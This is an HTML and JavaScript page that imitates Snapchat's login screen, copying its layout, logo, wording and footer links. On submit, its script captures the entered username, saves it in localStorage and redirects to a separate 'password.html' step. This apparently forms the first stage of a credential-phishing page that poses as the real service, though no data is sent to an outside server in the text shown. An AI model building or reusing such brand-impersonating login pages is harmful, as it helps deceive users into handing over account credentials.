<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login in | Snapchat</title>
  <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/016/716/474/non_2x/snapchat-icon-free-png.png" type="image/png">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      color: #333;
    }

    h1#app-title {
      font-weight: 502; /* Or use 'normal' */
      color: black;
      margin-top: 1px; /* Increase or decrease this */
      font-size: 27px;
    }

    .login-container {
      width: 100%;
      max-width: 320px;
      margin: 60px auto;
      background: white;
      padding: 30px;
      border-radius: 8px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    #input-label {
      font-weight: 550;  /* Makes the text bolder */
      color: #777;  /* Lighter grey color */
      font-size: 12.5px;  /* Slightly smaller font size */
      margin-left: -237px;  /* Move it slightly to the left */
    }

    .logo {
      width: 68px;
      margin-bottom: 20px;
    }

    .alt-login {
      color: #00aaf4;
      font-size: 14px;  /* Slightly smaller font size for the link */
      margin: 10px 0;
      font-weight: 550;
      text-decoration: none;
      height: 25px;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input[type="text"] {
      width: 100%;
      padding: 13px;
      margin-top: 10px;
      font-size: 14px;
      font-weight: 580;
      border: none;
      border-radius: 6px;
      outline: none;
      border: 1.2px solid transparent; /* Always 2px */
      background-color: #f5f5f5; 
      transition: border 0.16s ease;
    }

    input[type="text"]:hover {
      border-color: #00aaf4; /* Change only color */
    }

    .next-btn {
      background: #00aaf4;
      color: white;
      border: none;
      padding: 10px 30px;
      font-size: 16px;
      border-radius: 20px;
      cursor: pointer;
    }

    .signup-link {
      margin-top: 10px;
      text-align: center;
    }

    .signup-link a {
      color: black;
      font-weight: bold;
      text-decoration: none;
    }

    footer {
      background: #fff;
      padding: 30px;
      border-top: 1px solid #ddd;
    }

    .footer-columns {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-evenly;
      gap: 15px;
      margin-bottom: 20px;
    }

    .footer-columns div {
      min-width: 180px;
      margin-bottom: 10px;
    }

    .footer-columns h4 {
      margin-bottom: 10px;
      font-size: 14px;
      font-weight: 600;
    }

    .footer-columns a {
      display: block;
      text-decoration: none;
      color: #888;
      font-size: 14px;
      margin-bottom: 8px;
      font-weight: 370;
    }

    .language {
      padding-left: 71px;
      text-align: left;
      font-size: 14px;
      margin-top: -90px;
    }

    .language label {
      font-weight: 600; /* Makes the label text bold */
      font-size: 14px; /* Slightly larger font size to emphasize it as a header */
      display: block; /* Makes the label appear above the select box */
      margin-bottom: 8px; /* Adds some space between the label and the select box */
      color: #333; /* Dark text color for visibility */
    }

    .language select {
      padding: 5px;
      font-size: 14px;
      color: #777; /* Dark text color for visibility */
      border: 1px solid, #999;
      border-radius: 4px; /* Makes the corners rounded (increase the value for more curve) */
    }

    .footer {
      height: 70px;
      background-color: #222;
      display: flex;
      justify-content: center;
      align-items: center;
      padding-left: 102px;
      justify-content: flex-start; /* Align links to the left */
    }

    .footer-link {
      color: #666;
      text-decoration: none;
      font-weight: 599;
      font-size: 14px;
    }

    .footer-link:hover {
      text-decoration: underline;
    }

    .separator {
      width: 38px; /* Space between links */
    }

  </style>
</head>
<body>
  <div class="login-container">
    <img src="Downloads/snapchat_PNG10.png" alt="Snapchat Ghost Logo" class="logo" />
    <h1 id="app-title">Log in to Snapchat</h1>
    <form id="login-form">
      <label id="input-label" for="username">Username or Email</label>
      <input type="text" id="username" name="username" required />
      <a href="#" class="alt-login" id="alt-login">Use phone number instead</a>
      <button type="submit" class="next-btn" id="login-button">Next</button>
    </form>
  </div>

  <p class="signup-link">New To Snapchat? <a href="#">Sign Up</a></p>

  <footer>
    <div class="footer-columns" id="footer-columns"></div>
    <div class="language">
      <label for="lang">Language</label>
      <select id="lang">
        <option>English (US)</option>
        <option>English (US)</option>
        <option>Spanish</option>
        <option>French</option>
        <option>German</option>
        <option>Italian</option>
        <option>Portuguese (Brazil)</option>
        <option>Portuguese (Portugal)</option>
        <option>Arabic</option>
        <option>Chinese (Simplified)</option>
        <option>Chinese (Traditional)</option>
        <option>Japanese</option>
        <option>Korean</option>
        <option>Russian</option>
        <option>Turkish</option>
        <option>Hindi</option>
        <option>Swedish</option>
        <option>Norwegian</option>
        <option>Danish</option>
        <option>Finnish</option>
        <option>Polish</option>
        <option>Dutch</option>
        <option>Greek</option>
        <option>Czech</option>
        <option>Hungarian</option>
        <option>Romanian</option>
        <option>Bulgarian</option>
        <option>Hebrew</option>
        <option>Thai</option>
        <option>Vietnamese</option>
        <option>Indonesian</option>
        <option>Malay</option>
        <option>Filipino</option>
        <option>Ukrainian</option>
        <option>Latvian</option>
        <option>Lithuanian</option>
        <option>Estonian</option>
        <option>Serbian</option>
        <option>Slovak</option>
        <option>Slovenian</option>
        <option>Croatian</option>
        <option>Bosnian</option>
        <option>Albanian</option>
        <option>Georgian</option>
        <option>Armenian</option>
        <option>Tagalog</option>
        <option>Hindi (India)</option>
        <option>Punjabi</option>
        <option>Bengali</option>
        <option>Malayalam</option>
        <option>Telugu</option>
        <option>Marathi</option>
        <option>Gujarati</option>
        <option>Tamil</option>
        <option>Kannada</option>
      </select>
    </div>
  </footer>

  <script>
    const settings = {
      appName: "Log in to Snapchat",
      language: "en-US",
      loginFields: [
        {
          type: "text",
          label: "Username or Email",
          id: "username"
        }
      ],
      buttons: {
        login: "Next",
        alternateLogin: "Use phone number instead"
      },
      footerLinks: {
        company: ["Snap Inc.", "Careers", "News"],
        community: ["Support", "Community Guidelines", "Safety Center"],
        advertising: ["Buy Ads", "Advertising Policies", "Political Ads Library", "Brand Guidelines", "Promotions Rules"],
        legal: ["Privacy Center", "Your Privacy Choices", "Cookie Policy", "Report Infringement", "Custom Creative Tools Terms", "Community Geofilter Terms", "Lens Studio Terms"]
      }
    };

    document.getElementById('app-title').innerText = settings.appName;
    document.getElementById('input-label').innerText = settings.loginFields[0].label;
    document.getElementById('login-button').innerText = settings.buttons.login;
    document.getElementById('alt-login').innerText = settings.buttons.alternateLogin;

    const footer = document.getElementById('footer-columns');

    function capitalize(str) {
      return str.charAt(0).toUpperCase() + str.slice(1);
    }

    for (const section in settings.footerLinks) {
      const column = document.createElement('div');
      const heading = document.createElement('h4');
      heading.innerText = capitalize(section);
      column.appendChild(heading);

      settings.footerLinks[section].forEach(linkText => {
        const link = document.createElement('a');
        link.href = "#";
        link.innerText = linkText;
        column.appendChild(link);
      });

      footer.appendChild(column);
    }

    // Handle form submission and username capture
    document.getElementById('login-form').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent default form submission behavior

      // Get the value of the username input field
      const username = document.getElementById('username').value;

      // Log the username (for testing)
      console.log('Username:', username);

      // Save the username in localStorage
      localStorage.setItem('username', username);

      // Redirect to the password page
      window.location.href = 'password.html'; // Example password page URL
    });
  </script>

  <div class="footer">
    <a href="/privacy-policy" class="footer-link">Privacy Policy</a>  
    <span class="separator"></span>
    <a href="/terms-of-service" class="footer-link">Terms of Service</a>
  </div>
</body>
</html>
